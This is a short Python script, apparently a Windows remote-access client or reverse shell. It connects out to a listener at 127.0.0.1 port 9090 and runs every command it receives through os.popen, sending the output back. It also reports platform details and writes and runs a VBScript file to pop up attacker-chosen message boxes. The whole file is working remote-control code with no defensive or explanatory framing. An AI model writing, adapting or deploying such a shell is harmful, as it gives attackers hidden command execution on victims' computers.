import socket
import os
import platform

os.system('chcp 65001')

def main():
	while True:
		com = socket.recv(1024)
		cmd = com.decode('utf8')
		if (cmd == 'msg'):
			text = socket.recv(1024)
			title = socket.recv(1024)
			f = open('a.vbs','w')
			f.write('MyVar = MsgBox ("'+text.decode('utf8')+'", 16+16, "'+title.decode('utf8')+'")')
			f.close()
			os.system('a.vbs')
			os.system('del a.vbs')
			return main()
		if (cmd == 'uname'):
			uname = platform.platform()
			socket.send(uname.encode('utf8'))
			return main()
		if(cmd == "commands"):
			return main()

		syst = os.popen(cmd).read()
		socket.send(syst.encode('utf8'))

if __name__ == '__main__':
	host = '127.0.0.1'
	port = 9090
	srv = (host, port)
	socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.connect(srv)
	main()
